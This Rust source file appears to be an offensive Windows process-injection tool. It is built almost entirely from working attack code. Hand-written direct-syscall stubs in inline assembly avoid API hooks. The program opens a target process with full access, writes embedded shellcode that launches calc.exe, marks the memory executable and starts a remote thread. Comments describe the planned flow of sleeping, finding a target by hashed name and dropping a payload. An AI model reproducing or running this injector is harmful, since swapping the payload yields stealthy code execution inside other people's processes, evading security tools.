#![allow(unused_mut, unused_assignments)]
use std::ops::Deref;
use std::os::raw::c_void;
use std::ptr::null_mut;
use core::arch::global_asm;
use windows::{Wdk::Foundation::OBJECT_ATTRIBUTES, 
    Win32::{
        Foundation::{CloseHandle, HANDLE, HWND, NTSTATUS},
        System::{
            ProcessStatus::EnumProcesses, 
            Threading::{PROCESS_ACCESS_RIGHTS, 
                THREAD_ACCESS_RIGHTS, THREAD_ALL_ACCESS}, 
                WindowsProgramming::CLIENT_ID
        },
    }
};


// Types to make translating C -> rust less verbose.
type PVoid     = *mut c_void;       // C void*
type CCvoid    = *const c_void;     // C const void*
type PUsize    = *mut usize;        // C's PSIZE 

// A wrapper structure for the HANDLE type. This is useful as the handle will be dropped automatically.
struct SafeHandle(HANDLE);

impl Deref for SafeHandle {
    type Target = HANDLE;
    fn deref (&self) -> &Self::Target { 
        &self.0
    }
}
impl Drop for SafeHandle {
    fn drop(&mut self) {
        unsafe { 
            match CloseHandle(self.0) { 
                Ok(_) => println!("[+] Closed handle."),
                Err(e) => eprintln!("[!] Error closing handle\n-> {}", e),
            }
        }
    }
}

// Syscalls.
// These need to be ported to being dynamically loaded, 
// as the SNN's can change based on versions.
global_asm!("
    zw_read_virtual_memory:
        mov r10, rcx
        mov eax, 0x3F
        syscall
        ret
    nt_write_virtual_memory:
        mov r10, rcx
        mov eax, 0x3A
        syscall
        ret
    zw_allocate_virtual_memory:
        mov r10, rcx
        mov eax, 0x18
        syscall
        ret
    nt_open_process:
        mov r10, rcx
        mov eax, 0x26
        syscall
        ret
    nt_create_thread_ex:
        mov r10, rcx
        mov eax, 0x0C2
        syscall
        ret
    zw_protect_virtual_memory:
        mov r10, rcx
        mov eax, 0x50
        syscall
        ret
");

extern "C" {   
    fn zw_read_virtual_memory(
        process_handle: HANDLE,             // [in] Handle                              [HANDLE] 
        base_address: CCvoid,               // [in, opt] Where to start reading         [PVOID]
        buffer_ptr: CCvoid,                 // [out] ptr to buffer to read to           [PVOID]
        buffer_size: usize,                 // [in] buffer size                         [SIZE_T]
        bytes_read: *mut usize              // [out, opt] returns read size.            [PSIZE_T]
    ) -> NTSTATUS;

    fn nt_write_virtual_memory(    
        process_handle: HANDLE,             // [in] Handle                              [HANDLE] 
        base_address: CCvoid,               // [in, opt] Where to start writing         [PVOID] 
        buffer_ptr: CCvoid,                 // [in] pointer to buffer to write from     [PVOID] 
        buffer_size:  usize,                // [in] buffer size (write size)            [SIZE_T] 
        bytes_written: *mut usize           // [out, opt] returns size of write         [PSIZE_T] 
    ) -> NTSTATUS;
    
    fn zw_allocate_virtual_memory(
        process_handle: HANDLE,             // [in] Handle                              [HANDLE]
        base_address: *mut PVoid,           // [in, out] Where to allocate space        [*PVOID]
        zero_bits: usize,                   // [in] Allocation mask requirements        [ULONG]
        region_size: PUsize,                // [in, out] Region's size                  [PULONG]
        allocation_type: usize,             // [in] Commit, reserve, etc.               [ULONG]
        protection_flags: usize,            // [in] Type, R / W / X                     [ULONG]
    ) -> NTSTATUS;

    fn nt_open_process(
        process_handle_ptr: *mut HANDLE,    // [out] Handle will be returned here       [PHANDLE]
        access_mask: PROCESS_ACCESS_RIGHTS, // [in] Access mask, ex: PROCESS_ALL_ACCESS [ACCESS_MASK]
        oa_ptr: OBJECT_ATTRIBUTES,          // [in] Object attributes pointer           [POBJECT_ATTRIBUTES]
        client_id_ptr: CLIENT_ID,           // [in] ClientId struct PID goes in here    [PCLIENT_ID]
    ) -> NTSTATUS;

    fn nt_create_thread_ex(
        handle_ptr: *mut HANDLE,            // [out] Handle to thread will be returned  [PHANDLE]
        acces_mask: THREAD_ACCESS_RIGHTS,   // [in] Access mask, ex:THREAD_ALL_ACCESS   [ACCESS_MASK]
        obj_attributes: CCvoid,             // [in, opt] Object attributes              [OBJECT_ATTRIBUTES]
        process_handle: HANDLE,             // [in] Handle for process                  [HANDLE]
        start_routine: CCvoid,              // [in] Thread start address                [PUSER_THREAD_START_ROUTINE]
        arguments: CCvoid,                  // [in, opt] Passed arguments,              [PVOID]
        create_flags: u32,                  // [in, opt] Creation flags, 0x0            [ULONG]
        zerobits: usize,                    // [in] Mask, 0x0 for default.              [SIZE_T]
        stack_size: usize,                  // [in] Stack size, 0x0 for default,        [SIZE_T]
        stack_max: usize,                   // [in] Stack's max size, 0x0 for default   [SIZE_T]
        attribute_list: CCvoid,             // [in, opt] attribute list                 [PPS_ATTRIBUTE_LIST]
    ) -> NTSTATUS;
    
    fn zw_protect_virtual_memory(
        process_handle: HANDLE,             // [in] Handle to process.                  [HANDLE]
        base_address: *mut PVoid,           // [in, out] Pointer to start address.      [*PVOID]
        region_size:  PUsize,               // [in, out] Size of alter region           [PSIZE_T]
        proc_flag: usize,                   // [in] New protection flags.               [ULONG]
        flag_old: *mut usize                // [out] Returns old protection flags       [PULONG]
    ) -> NTSTATUS;
}


fn enumerate_processes() -> Result<Vec<usize>, windows::core::Error> {
    let mut pids: Vec<u32> = vec![0u32; 1024];
    let mut bytes_returned: u32 = 0u32;
    const SIZE_OF_U32: usize = std::mem::size_of::<u32>();
    unsafe {
        EnumProcesses(
            pids.as_mut_ptr(),
            (pids.len() * SIZE_OF_U32) as u32,
            &mut bytes_returned,
        )?;
    }
    // Let's empty out the pids.
    pids.resize(bytes_returned as usize / SIZE_OF_U32, 0);
    let pids_usize: Vec<usize> = pids.iter().map(|x: &u32| *x as usize).collect();
    Ok(pids_usize)
}

fn nt_write_process_memory(handle: HANDLE, address: usize, mut data: Vec<u8>) -> Result<(), NTSTATUS> { 
    let base_address:       CCvoid = address as CCvoid;
    let buffer_ptr:         CCvoid = data.as_mut_ptr() as *mut c_void;
    let mut bytes_written:  usize = 0; 
    let mut written_ptr:    PUsize = &mut bytes_written as PUsize;
    println!("[-] Running WPM.");
    unsafe { 
        let status = nt_write_virtual_memory(
            handle, 
            base_address, 
            buffer_ptr, 
            data.len(), 
            written_ptr
        ); 
        if status.is_ok() { 
            println!("[+] WPM Succeeded.\n-> Wrote {}", bytes_written);
            return Ok(());
        }
        eprintln!("[!] WPM Failed!\n-> NTSTATUS: {:#x}", status.0);
        return Err(status);
    }
}

fn nt_read_process_memory(handle: HANDLE, address: usize, amount_to_read: usize) -> Result<Vec<u8>, NTSTATUS> { 
    let base_address:   CCvoid = address as CCvoid;
    let mut buffer:     Vec<u8>= vec![0u8; amount_to_read]; 
    let buffer_ptr:     CCvoid = buffer.as_mut_ptr() as PVoid;
    let mut bytes_read: usize  = 0;
    let mut read_ptr:   PUsize = &mut bytes_read as PUsize;
    println!("[-] Running RPM.");
    unsafe { 
        let status = zw_read_virtual_memory(
            handle, 
            base_address, 
            buffer_ptr, 
            amount_to_read, 
            read_ptr
        );
        if status.is_ok() { 
            println!("[+] RPM Succeeded.\n-> Read {}", bytes_read);
            return Ok(buffer);
        }
        eprintln!("[!] RPM Failed!\n-> NTSTATUS: {:#x}", status.0);
        return Err(status);
    }
}

fn nt_virtual_alloc(handle: HANDLE, address: Option<usize>, protection_flags: Option<usize>, size: Option<usize>) -> Result<PVoid, NTSTATUS> {
    let mut base_address:   PVoid = match address { 
        Some(number)    => number as PVoid,
        None                   => null_mut(),
    };
    let zero_bits:          usize = 0;
    let mut region_size:    usize = match size { 
        Some(size)  =>  size,
        None               =>  4096
    };
    let allocation_type:    usize = 0x00001000; 
    let protection_flags:   usize = match protection_flags{ 
        Some(flags) => flags,    
        None        => 0x00000004, // PAGE_READWRITE
    };
    println!("[-] Running VirtualAlloc.");
    unsafe { 
        // Let's try ZwAllocateVirtualMemory
        let status = zw_allocate_virtual_memory(
            handle,
            &mut base_address,
            zero_bits,
            &mut region_size,
            allocation_type,
            protection_flags,
        );
        if status.is_ok() { 
            println!("[+] VirtualAlloc Succeeded.\n-> {:#x} - {:#x}",  base_address as usize, base_address as usize + region_size);
            return Ok(base_address);
        }
        eprintln!("[!] VirtualAlloc Failed!\n-> NTSTATUS: {:#x}", status.0);
        return Err(status);

    }
}

fn nt_get_handle(pid: usize) -> Result<SafeHandle, NTSTATUS> {
    let mut handle = HANDLE::default();
    let mut handle_ptr = &mut handle as *mut HANDLE;
    let desired_access = PROCESS_ACCESS_RIGHTS(0xFFFF); //0x0010 | 0x0020 | 0x0008 | 0x0400 <- Correct flags, at the moment, we are using debug flags.
    let oa = OBJECT_ATTRIBUTES::default();
    let client_id: CLIENT_ID = CLIENT_ID{
        UniqueProcess: HANDLE::from(HWND(pid as isize)),
        UniqueThread: HANDLE::default()
    };

    unsafe { 
        let status = nt_open_process(
            handle_ptr,
            desired_access,
            oa,
            client_id,
        );
        if status.is_ok() { 
            println!("[+] OpenProcess Succeeded.\n-> Returned handle <{:?}>", handle.0);
            return Ok(SafeHandle(handle));
        }
        eprintln!("[!] OpenProcess Failed!\n-> NTSTATUS: {:#x}", status.0);
        return Err(status);
    }

}

fn nt_create_remote_thread_ex(handle: HANDLE, address: CCvoid) -> Result<(), NTSTATUS> {
    let mut handle_base = HANDLE::default(); 
    let mut handle_ptr = &mut handle_base as *mut HANDLE;
    unsafe { 
        let status = nt_create_thread_ex(
            handle_ptr,            
            THREAD_ALL_ACCESS,
            null_mut() as CCvoid,
            handle,
            address,
            null_mut() as CCvoid,
            0x0,
            0x0,
            0x0,
            0x0,
            null_mut() as CCvoid,
        );
        if status.is_ok() { 
            println!("[+] CreateRemoteThread Succeeded");
            return Ok(());
        }
        eprintln!("[!] CreateRemoteThread Failed!\n-> NTSTATUS: {:#x}", status.0);
        return Err(status)
    }
}

fn nt_virtual_protect_ex(handle: HANDLE, address: CCvoid, size: usize, flags: usize) -> Result<CCvoid, NTSTATUS>{
    let mut old_flags: usize = 0x0;
    let mut old_flags_ptr = &mut old_flags as *mut usize;
    let mut address_pointer: PVoid = address as PVoid;
    let mut size = size;
    let mut size_pointer = &mut size as PUsize;
    unsafe {
        let status = zw_protect_virtual_memory(
            handle, 
            &mut address_pointer, 
            size_pointer, 
            flags,
            old_flags_ptr,
        );
        if status.is_ok() { 
            println!("[+] ProtectVirtualMemory Succeeded");
            return Ok(address);
        }
        eprintln!("[!] ProtectVirtualMemory Failed!\n-> NTSTATUS: {:#x}", status.0);
        return Err(status)
    }
}

// The current execution flow idea is as follows:
// This program starts, it sleeps for 30 seconds.
// After sleeping, it'll look for a specified process 
// by matching hashed names against a hash.
// If it finds the specified process, it'll allocate
// a new block of WRITE space, where it´ll write and drop a payload.
// Now, after sleeping for 10 seconds, this will turn the page to EXECUTE
// and start the thread execution. Now, we close the handle(s) and continue our lives.

fn main() {
    // This opens a calculator
    let payload: [u8; 276] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
    0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,
    0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
    0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
    0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,
    0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,
    0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,
    0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,
    0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
    0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,
    0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,
    0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
    0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,
    0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
    0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,
    0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,
    0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,
    0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,
    0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,
    0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,
    0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,
    0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,
    0x2e,0x65,0x78,0x65,0x00]; 
    
    let current_process_pid = enumerate_processes().unwrap();
    //let args: Vec<String> = env::args().collect();
    let current_process_handle = nt_get_handle(*current_process_pid.last().unwrap()).unwrap();
    //let current_process_handle = nt_get_handle(args[1].parse::<usize>().unwrap()).unwrap();
    // Let's allocate the required memory:
    
    let addr_space = nt_virtual_alloc(*current_process_handle, None, Some(0x04), Some(payload.len())).unwrap();
    // Let's write the buffer:
    nt_write_process_memory(*current_process_handle, addr_space as usize, payload.to_vec());

    //virtual_protect_ex(*current_process_handle, addr_space, payload.len());
    nt_virtual_protect_ex(*current_process_handle, addr_space, payload.len(), 0x10);

    nt_create_remote_thread_ex(*current_process_handle, addr_space);
    // Sleep to make sure the injection was succesful.
    /*use std::{thread, time};
    let ten_millis = time::Duration::from_millis(100);
    thread::sleep(ten_millis);

    let variable_to_read = 100u8;
    let variable_location = &variable_to_read as *const _ as *const c_void;
    let buff = nt_read_process_memory(*current_process_handle, variable_location as usize, 1);
    nt_write_process_memory(*current_process_handle, variable_location as usize, vec![64u8]);
    let buff = nt_read_process_memory(*current_process_handle, variable_location as usize, 1);

    
    let addr_space = nt_virtual_alloc(*current_process_handle, None, None).unwrap();
    nt_virtual_alloc(*current_process_handle, Some(addr_space as usize), Some(0x20)); 
     */    
}
